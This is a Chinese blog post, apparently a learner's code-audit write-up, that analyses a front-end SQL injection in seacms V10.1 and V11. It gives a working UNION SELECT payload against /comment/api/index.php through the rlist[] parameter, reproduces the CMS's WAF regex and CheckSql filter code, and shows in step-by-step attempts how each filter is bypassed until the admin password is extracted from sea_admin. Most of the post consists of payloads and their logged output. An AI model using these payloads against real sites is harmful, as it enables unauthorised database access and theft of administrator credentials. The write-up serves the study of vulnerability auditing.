\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/PMutZvYD\_C6NXrs87Z8W6Q)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZyLXh2ia0AsKF6yM8k5wEaUDicAEeiaQUPcjN0O8NlyajIetDVg0ZVRZ9A/640?wx_fmt=png)

最近在学代码审计，但总是学了忘，所以把思路步骤全写下来，便于后期整理。这次审计的是 seacmsV10.1，但是审完返现 V11 也有同样的漏洞。先放 payload:

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)//@\*\*@\`'\`\*\*//UNION--%0ASELECT%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZxGtmtNt7blK7ECMBQPYS4kvKXXWQyHA9nfSqmVqeQGcdww4Vibt6ZpA/640?wx_fmt=png)代码审计不知道该如何入手，所以去看了 cnvd, 在 cnvd 上看到 seacms10.1 有个前台注入，于是尝试分析了一波，全部弄完发现作者发布了最后一版  

> 更新日期：2020 年 06 月 08 日 v11  
> 更新新域名 https://www.seacms.org  
> 以后不再更新, 从此山高水长，有缘再见。

至于 V11，一模一样的漏洞，这次标题完全可以改成 seacmsV0.1&V11 前台注入漏洞。

### 过程

用 seay 源代码审计系统先看看哪些地方容易出现注入，但内容太多了，因为看到的是前台 sql 注入，于是在审计时把`admin`目录下的内容全删除了，内容太多，所以先分析`select`, 在弄其他的。 

入口点分析： 

之前分析过 6.45-6.55 的代码执行，所以轻易找到处理传参的地方`/include/common.php`：

作者为了避免之前的变量覆盖对所有我能想到的传参方式都做了匹配，`GLOBALS|_GET|_POST|_COOKIE|_REQUEST|_SERVER|_FILES|_SESSION`。

```
//检查和注册外部提交的变量
$jpurl='//'.$\_SERVER\['SERVER\_NAME'\];
foreach($\_REQUEST as $\_k=>$\_v)
{
  if( strlen($\_k)>0 && m\_eregi('^(cfg\_|GLOBALS|\_GET|\_POST|\_COOKIE|\_REQUEST|\_SERVER|\_FILES|\_SESSION)',$\_k))
  {
    Header("Location:$jpurl");
    exit('err1');
  }
}

```

输出报错从`err0`写道`err7`。   

随便构造个语句，比如`?di=1 union select`看看防护在哪。注: 语句瞎写的，用来找防护在哪。

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZTnjzKAJYDepHcz8dbhA0kibNu5GQRfqtD72QbaeRwFT14YvVjWmKib3w/640?wx_fmt=png)

根据报错搜索全文

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZ5hdUQIbgTgvOBQLFQRM5K71CndVq0TzCX2GbX9OGBRtJRjyLzr3ecg/640?wx_fmt=png)

在`Upload/include/webscan/webscan.php`有对`get post cookie`输入的内容拦截，`get`拦截内容如下：

```
//get拦截规则
$getfilter = "\\\\<.+javascript:window\\\\\[.{1}\\\\\\\\x|<.\*=(&#\\\\d+?;?)+?>|<.\*(data|src)=data:text\\\\/html.\*>|\\\\b(alert\\\\(|confirm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s\*?\\(.\*\\)|sleep\\s\*?\\(.\*\\)|\\\\b(group\_)?concat\[\\\\s\\\\/\\\\\*\]\*?\\\\(\[^\\\\)\]+?\\\\)|\\bcase\[\\s\\/\\\*\]\*?when\[\\s\\/\\\*\]\*?\\(\[^\\)\]+?\\)|load\_file\\s\*?\\\\()|<\[a-z\]+?\\\\b\[^>\]\*?\\\\bon(\[a-z\]{4,})\\s\*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s\*?(\[\\\\(\\\\)'\\"\\\\d\]+?=\[\\\\(\\\\)'\\"\\\\d\]+?|\[\\\\(\\\\)'\\"a-zA-Z\]+?=\[\\\\(\\\\)'\\"a-zA-Z\]+?|>|<|\\s+?\[\\\\w\]+?\\\\s+?\\\\bin\\\\b\\\\s\*?\\(|\\\\blike\\\\b\\\\s+?\[\\"'\])|\\\\/\\\\\*.\*\\\\\*\\\\/|<\\\\s\*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s\*(\\(.+\\)\\s\*|@{1,2}.+?\\s\*|\\s+?.+?|(\`|'|\\").\*?(\`|'|\\")\\s\*)|UPDATE\\s\*(\\(.+\\)\\s\*|@{1,2}.+?\\s\*|\\s+?.+?|(\`|'|\\").\*?(\`|'|\\")\\s\*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(\`|'|\\").\*?(\`|'|\\"))FROM(\\\\(.+\\\\)|\\\\s+?.+?|(\`|'|\\").\*?(\`|'|\\"))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)";

```

其中`UNION.+?SELECT`在印象中可以使用正则逃逸解决, 即空格可以使用`%2d%2d%0a`、`%23%0a`之类的代替，构造`?id=1%2d%2d%0aunion%2d%2d%0aselect%2d%2d%0a1,2,3`。  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZVDGbtZUqTSl9aRHyicBkneV9OzXFpFaY6MkicrdyB2tv7e9euejB0M9g/640?wx_fmt=png)

虽然不知道能不能用，最起码检测过去了。 

解下来看看有哪些地方执行了`sql语句`，在`seay`没跑完的时候，已经出来一堆了相关语句了。

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZxibvPQ16WN7CmadUWMpZ72AvpZMNtCF6w59vD3LiaeVFKr1n2wJicL3PA/640?wx_fmt=png)

感觉看完头肯定会很凉，而且我代码很菜，sql 语句也很菜，所以先尝试去看看和`select`相关的地方。 

访问`Upload/member.php`

```
if($mod=='repsw2'){
  require\_once('data/admin/smtp.php');
  if($smtppsw=='off'){showMsg("抱歉，系统已关闭密码找回功能！","index.php",0,100000);exit();}
  if(empty($repswname)){{showMsg("请输入账户名称！","-1",0,3000);exit();}}
  $row=$dsql->GetOne("select \* from sea\_member where user);

```

在这个地方看到了`select`, 通读得知在找回密码时会到这里，访问

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZD7kcJXpuQmcibdqdjEpCWruePu6fPFrLiaKib0d51mJXcOVtx7m7tpl9A/640?wx_fmt=png)

无法访问，修改`Upload/data/admin/smtp.php`内`$smtppsw = "on"`, 断点追踪，发现在`Upload/include/sql.class.php`内会有检查；

```
//SQL语句安全检查
$sql=CheckSql($sql);

```

里面一堆东西，穿个语句试试，构造`test%2d%2d%0aunion%2d%2d%0aselect%2d%2d%0a1,2,3`, 执行的过程很神奇，我在`$sql=CheckSql($sql);`后输出了`$sql`，好像没对语句进行修改。  

直接构造`test' and updatexml(1,0x7e,1)#`

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZApJpeya2Uotsvia6ZbKiajyCymxcXh4ENOc1L8WoOicD48QpI1tf67cWA/640?wx_fmt=png)

报错

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZD8z8ibvJYylJkZ03ic1ToMp8xhHgMp1V9KSU6C6zHjsd1sXcibDsiaLP9Q/640?wx_fmt=png)

定位错误，发现错误在`CheckSql();`内，研究发现

```
//SQL语句过滤程序，由80sec提供，这里作了适当的修改
function CheckSql($db\_string,$querytype='select')

```

也就是说只要能过了检测，那语句就是想怎么玩怎么玩了。网上百度的是用``@`'`sql语句#'``来绕过防护。这个地方是字符型传参，所以前面加个`'`闭合，根据网上的教程，构造  

```
@\`%27\`@\`%27\`and%20updatexml(1,0x7e,1)#'

```

这样危险字符会被转成`$s$`，从而绕过后面的检查，但是结果了出现了`$s$$s$`  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZ2X3gyr5ErgBkLibdk8iaSIoychicWoribFBMoQDyyiabt4vfFsYK7PrWZAg/640?wx_fmt=png)

而在代码中有这么个判断：

```
if (stripos($clean, '@') !== FALSE  OR stripos($clean,'char(')!== FALSE  OR stripos($clean,'script>')!== FALSE   OR stripos($clean,'<script')!== FALSE  OR stripos($clean,'"')!== FALSE OR stripos($clean,'$s$$s$')!== FALSE)
  ……
  {
  $fail = TRUE;
  if(preg\_match("#^create table#i",$clean)) $fail = FALSE;
  $error="unusual character";
  }
    if (!empty($fail))
  {
    fputs(fopen($log\_file,'a+'),"$userIP||$getUrl||$db\_string||$error\\r\\n");
    exit("<font size='5' color='red'>Safe Alert: Request Error step 2!</font>");
  }

```

根据代码可知，只要有`$s$$s$`就会中断执行。 

后面试了很多方法，都不行，各位有好方法还请赐教。而且页面试了其他地方的，也不行，很多参数都是直接读取的，没法控制。 

换一个地方，找一个数字型的地方试试。 

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZYVM2u5yVSPHgUrP2SGtkQMjXh0iciclxfLaoiaFEibsm5UtJ43JA7qvWCw/640?wx_fmt=png)

查看`Upload/comment/api/index.php`文件，用到`select`的地方只有 4 个，待会儿挨个查看。 

开头`$gid $page $type`进行了判断，但是`is_numeric`是弱类型，可以使用 16 进制绕过。 

```
$id = (isset($gid) && is\_numeric($gid)) ? $gid : 0;
$page = (isset($page) && is\_numeric($page)) ? $page : 1;
$type = (isset($type) && is\_numeric($type)) ? $type : 1;

```

根据代码构造`?gid=1&page=2&rtype=1`，注意`page<2`会中断运行，断点追踪执行过程  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZHRUFibuw1xV9tlzPs45JRnGL3UGoU2HZzlwAbnUlo3zEib9YeNmPPT7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZmouugVe624sQUqxia1vibmJHTBVna0ZwS2BuAG9FeBAAwT6gBqgSMClw/640?wx_fmt=png)

发现经过上述 4 条语句中的前两条，尝试使用 16 进制做判断，测试了很多方法，用了好久都不行，后来直接在数据库里构造也没弄出合适的语句 

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZTbru1VhBZ9o0YlfdksjPiaB3P2xPrth8EMD57M3QTAIITia1jd3OUVkA/640?wx_fmt=png)

只能接着往下看了。接下来是

```
$sql = "SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea\_comment WHERE m\_type=$type AND id in ($ids) AND ischeck=1 ORDER BY id DESC";

```

里面有两个参数`$type`和`$ids`, 查看`$ids`是如何构造的  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZ9RV5LLFA7m3NgFiaDhRgppekT4pQjkTTTs5icibdib5VCpNiclsC3FicS86Q/640?wx_fmt=png)

梳理下过程，函数运行到 18 行`$h = ReadData($id,$page);`之后，在第 19 行开始赋值`$rlist = array();`, 一路运行到 24 行`die($h);`重新运行`$h = ReadData($id,$page);`此时`$rlist`是一个空数组。

在函数`ReadData`中 

```
function ReadData($id,$page)
{
  global $type,$pCount,$rlist;
  $ret = array("","",$page,0,10,$type,$id);
  if($id>0)
  {
    $ret\[0\] = Readmlist($id,$page,$ret\[4\]);
    $ret\[3\] = $pCount;
    $x = implode(',',$rlist);
    if(!empty($x))
    {
    $ret\[1\] = Readrlist($x,1,10000);
    }
  } 

```

在`id>0`时首先执行`$ret[0] = Readmlist($id,$page,$ret[4]);`, 而在函数`Readmlist`中对`$rlist`进行了处理  

```
function Readmlist($id,$page,$size)
{
  global $dsql,$type,$pCount,$rlist;
  $rlist = str\_ireplace('@', "", $rlist); 
  $rlist = str\_ireplace('/\*', "", $rlist);
  $rlist = str\_ireplace('\*/', "", $rlist);
  $rlist = str\_ireplace('\*!', "", $rlist);

```

这里把一些符号做了过滤，接着执行`$x = implode(',',$rlist);`，当`$x`不为空则执行`$ret[1] = Readrlist($x,1,10000);`，在函数`Readrlist`中  

```
$sql = "SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea\_comment WHERE m\_type=$type AND id in ($ids) AND ischeck=1 ORDER BY id DESC";

```

根据之前的内容分析，只要满足`id>0`且`$page不小于2`，构造类似`rlist[]=1234)sql语句`便可以执行语句。考虑到之前的拦截，尝试构造了  

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)@\`'\`union%2d%2d%0aselect%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

报错如下  

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZxBBHr3e8gBVAsfgc9ps6UJcmt6zFibazTjbl8kzvA4H9og2tDVEVzTg/640?wx_fmt=png)

全局搜索，在`Upload/include/sql.class.php`中

```
 if($querytype=='select')
  {
    $notallow1 = "\[^0-9a-z@\\.\_-\]{1,}(union|sleep|benchmark|load\_file|outfile)\[^0-9a-z@\\.-\]{1,}";
    //$notallow2 = "--|/\\\*";
    if(m\_eregi($notallow1,$db\_string)){exit('SQL check');}
    if(m\_eregi('<script',$db\_string)){exit('SQL check');}
    if(m\_eregi('/script',$db\_string)){exit('SQL check');}
    if(m\_eregi('script>',$db\_string)){exit('SQL check');}
    if(m\_eregi('if:',$db\_string)){exit('SQL check');}
    if(m\_eregi('--',$db\_string)){exit('SQL check');}
    if(m\_eregi('char(',$db\_string)){exit('SQL check');}
    if(m\_eregi('\*/',$db\_string)){exit('SQL check');}
  }

```

不允许有小写的`union`和`select`，重新构造

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZjouDmXunhd1xUG1otu4FN96MOGyn1sByplyv6FIgsmxZgXUEiaDmvTg/640?wx_fmt=png)

没执行，但是没有报拦截, 断点追踪，看看语句

```
SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea\_comment WHERE m\_type=1 AND id in (1)\`\\'\`UNION--
SELECT#
1,2,3,4,5,6,7,8,9,10,11#
from#
sea\_admin-- \\') AND ischeck=1 ORDER BY id DESC

```

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZ5hLz7nDicZqgkk5njObiaZ8NiapNfibia3IaVOPO23P8avOPO2f1xqfQCXQ/640?wx_fmt=png)

分析可知，多了个单引号，这个单引号虽然有助于绕过 80sec 防注入，但是在数据库里会出问题，尝试注释搞掉它 因为有过滤，所以试着用下面的方式进行注释

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)@\`/\`@\`\*\`@\`'\`@\`\*\`@\`/\`UNION--%0ASELECT%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

追踪日志执行的语句为

```
SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea\_comment WHERE m\_type=1 AND id in (1)\`/\`\`\*\`\`\\'\`\`\*\`\`/\`UNION--
SELECT#
1,2,3,4,5,6,7,8,9,10,11#
from#
sea\_admin-- \\') AND ischeck=1 ORDER BY id DESC

```

同样不行，也尝试过构造

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)@\`/\*\`@\`'\`@\`\*/\`UNION--%0ASELECT%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

报错

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZCcNoGsot9stlgia1PTrDOTECsAkRPCT5MjcCnamlCUZd1GL2q438RBQ/640?wx_fmt=png)

其实这时候说明成功构造了出了`/**/`, 只不过被拦截了，使用`@`插在`/`和`*`中间打破正则，构造

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)@\`/@\*\`@\`'\`@\`\*/\`UNION--%0ASELECT%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

结果没报错，查看日志发现构造的注释没有了

```
SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea\_comment WHERE m\_type=1 AND id in (1)\`\`\`\\'\`\`\`UNION--
SELECT#
1,2,3,4,5,6,7,8,9,10,11#
from#
sea\_admin-- \\') AND ischeck=1 ORDER BY id DESC

```

这个是因为之前的那个过滤

```
function Readmlist($id,$page,$size)
{
  global $dsql,$type,$pCount,$rlist;
  $rlist = str\_ireplace('@', "", $rlist); 
  $rlist = str\_ireplace('/\*', "", $rlist);
  $rlist = str\_ireplace('\*/', "", $rlist);
  $rlist = str\_ireplace('\*!', "", $rlist);

```

双写绕过试试，构造

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)@\`//@\*\*\`@\`'\`@\`\*\*//\`UNION--%0ASELECT%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

结果如下

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZfqR6mIP1hfM35r5CFqLQL9o8nDJibjNcGlkjic1DO4HSicLPeTsBveHGw/640?wx_fmt=png)

查看日志

```
SELECT id,uid,username,dtime,reply,msg,agree,anti,pic,vote,ischeck FROM sea\_comment WHERE m\_type=1 AND id in (1)\`/\*\`\`\\'\`\`\*/\`UNION--
SELECT#
1,2,3,4,5,6,7,8,9,10,11#
from#
sea\_admin-- \\') AND ischeck=1 ORDER BY id DESC

```

狗血的是我在数据库里调试时把注释两头的点去掉就能用了

```
\`/\*\`\`\\'\`\`\*/\`

```

改成

```
/\*\`\\'\`\*/

```

而两头的点只要把之前构造的语句换成

```
/comment/api/index.php?gid=1&page=2&type=1&rlist\[\]=1)//@\*\*@\`'\`\*\*//UNION--%0ASELECT%23%0A1,2,3,4,5,6,7,8,9,10,11%23%0Afrom%23%0Asea\_admin-- '

```

就可以了，如下图

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZwrkLwv9R8pv9n0cjD4OubA232M1w0aJvmKXTfDic4AVKzeGsPVNDAAw/640?wx_fmt=png)

查个密码

![](https://mmbiz.qpic.cn/mmbiz_png/sGfPWsuKAffh9uzG2HspxKlibwWVBib5bZEWmdlhRFnJxxNCwuatkn4yR3Z1lRzpicKqepavs07thHmiaag36pOyIQ/640?wx_fmt=png)

### 总结

作为一个总是记不住各种函数的小萌新，整个过程总结下来，不过是：

1、在找到负责执行的语句

2、找到输入的地方，构造相应的传参

3、追踪过程，根据报错找到拦截的地方，思考绕过的方式

4、构造能顺利执行的语句，反推如何输入

这是我学代码审计的第二周，也是我审计的第三个 cms, 在这过程中深刻体会到一句话: **漏洞的本质在于输入和输出的控制**, 道阻且长，代码多不胜数，慢慢记吧。

![](https://mmbiz.qpic.cn/mmbiz_jpg/sGfPWsuKAfeibiahLB2ygmQDWKPibocFLVp3xWu8OuId8iciazic5rhcfajBpcK3iaYicN55UQEZPnVJ5icAvVKcib9Ieacw/640?wx_fmt=jpeg)